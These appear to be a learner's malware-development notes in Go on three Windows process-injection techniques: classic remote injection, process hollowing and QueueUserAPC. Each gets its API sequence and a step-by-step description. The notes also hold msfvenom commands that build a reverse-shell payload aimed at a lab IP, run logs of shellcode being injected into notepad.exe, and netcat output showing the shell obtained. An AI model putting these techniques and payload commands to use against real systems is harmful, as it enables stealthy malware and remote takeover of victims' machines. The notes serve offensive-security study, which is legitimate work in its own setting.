===============1. Classic Shellcode Injection===============
- Very similar to shellcode runner technique. Only difference is the shellcode
will be injected to a remote process rather than current process.
Get external library:
Create a venv in go:
	cmd> go mod init <name>
Add the library
	cmd> go get golang.org/x/sys/windows

Generate Payloads:
1. Calc:
	kali> msfvenom  -f hex -p windows/x64/exec cmd=calc 
2. windows/x64/exec 
	kali>msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.1.108 LPORT=4444 -f hex

-----WinAPI required-------
1. OpenProcess
2. VirtualAllocEx
3. WriteProcessMemory
4. VirtualProtectEx
5. CreateRemoteThread

-------Get a handle on a remote process----
- We use the OpenProcess winapi which is part of the windows package.

-----Allocating memory on remote process----
- VirtualAllocEx will be used for allocating memory for our shellcode inthe
remote memory.
- We will make a kernel32.dll call as its not part of the package


-----Writing Shellcode to remote Process------
- WriteProcessMemory winapi will be used to write shellcode to the remote 
memory.

-----Change Memory Permissions----------
- Since the memory was set to PAGE_READWRITE we now need to set then to
PAGE_EXECUTE_READ using VirtualProtectEx
NOTE: Keep the old permissions incase we want to restore them later.

-----Create Remote Thread-----------
- CreateRemoteThread API will create a thread and run our shellcode.


====================================================================
Analogy
Classic Injection: Like boarding a moving bus and taking control

Process Hollowing: Like stealing a bus from the depot, repainting it, 
and driving it as your own while it still looks like a city bus
====================================================================


===============2. Process Hallowing=================
- Involves creating a process in a suspended state then unmapping/hollowing 
its memory to be replaced with malware code.

-----WinAPI required-----------
1. CreateProcess
2. NtQueryInformationProcess
3. ReadProcessMemory
4. WriteProcessMemory
5. ResumeThread

-------Create Suspended Process--------------
- Call the CreateProcess API to start a process.
- Set to the exact folder for our suspended process.

------Idetify Image Base Address-------------
- Get the base address of the image using NtQueryInformationProcess
- After getting the base address we use ReadProcessMemort winapi that
allows us to read the memory of a remote process.

-----Identify the entry Point------------
- We find the Portable executable signature from the contents of the
ReadProcessMemory.

------Overwrite code with shellcode----------
- We can now use WriteProcessMemory winapi to write our shellcode to the
target region. API used to write shellcode to remote memory.
NOTE: Benefits over classic process injection is we dont create a new thread
but we just overwrite the contents in memory and resume the suspended thread.

------Resume Execution----------------
- To resume execution we only have to resume the suspended thread.
- ResumeThread API will be used here.

***********************Process Hollowing(main.go)************************
cmd>> go run main.go
[+]Process Created from path: C:\Windows\System32\notepad.exe with PID: 7892
[+] Process Handle: 1a8
[+] Thread Handle: 1a4
[+]Address holding image base address: 0x6c380a4010
[+]Number of bytes read: 8
[+Image base: 0x7ff797080000
[+PE signature offser: 0x100
[+] Entry Point Offset: 0x23bd0
[+] Entry Point Address Identified 0x7ff7970a3bd0
[+] Wrote 460460 shellcode bytes to destinamation address
[+]Resuming Suspended Thread- Shellcode should execute now!

----------On Kali Linux--------------------------------------
┌──(kali㉿kali)-[~]
└─$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [192.168.1.108] from (UNKNOWN) [192.168.1.106] 60027
Microsoft Windows [Version 10.0.19045.6466]
(c) Microsoft Corporation. All rights reserved.

J:\Go\Malware Development\Code_Injection\Process_Hollowing>whoami
whoami
desktop-lsf7uhq\user
************************************************************************

==========================3.QueueUserAPC================================
APC= Asynchronous Procedure Call
- This a combination of the two previous techniques:
1. Process Hollowing
2. Classic Process Injection
- Unlike process hallowing it will not overwrite the components of the
main thread but allocate a new memory region.
- Executes the our shell code when the main thread resumes.
- The difference is we will not be calling the CreateRemoteThread API.
WINAPI required:
1. CreateProcess
2. VirtualAllocEx
3. WriteProcessMemory
4. QueueUserAPC
5. ResumeThread

--------Creating a suspended process--------------------------
- CreateProcess API does this for us.
- Most important parameter is the dwCreationFlags should be set to 
CREATE_SUSPENDED(0x04).


-------Allocating memory on remote Process-------------------
- VirtualAllocEx will be used to allocate memory for our shellcode inthe 
remote memory.

-------Writing SHellcode to remote Process--------------------
- WriteProcessMemory winapi will be used to write shellcode to the remote
memory.

------ Resume Execution--------------------
- To resume execution we only have to resume the suspednded thread. The
ResumeThread API will be used.

Compiling EXE:
	kali> msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.1.108 LPORT=4444 -f hex

****************************QUEUE APC Injection(main.go)***********************
cmd>>go run main.go
[+]Process Created from Path: C:\Windows\System32\notepad.exe with PID 11908
[+]Process Handle: 1a8
 [+] Thread Handle: 1a4
[+] Allocated Memory Address: 0x117f9030000
[+]Wrote 460460 shellcode bytes to destination address
[+] Successfully queued APC to thread 0x1a4
[+] Resuming Suspended Thread - APC should execute shellcode!

-----------On Kali Linux------------------------
──(kali㉿kali)-[~]
└─$ nc -lvnp 4444  
listening on [any] 4444 ...
connect to [192.168.1.108] from (UNKNOWN) [192.168.1.106] 54477
Microsoft Windows [Version 10.0.19045.6466]
(c) Microsoft Corporation. All rights reserved.

J:\Go\Malware Development\Code_Injection\QueueUserAPC>whoami
whoami
desktop-lsf7uhq\user

*********************************************************************************
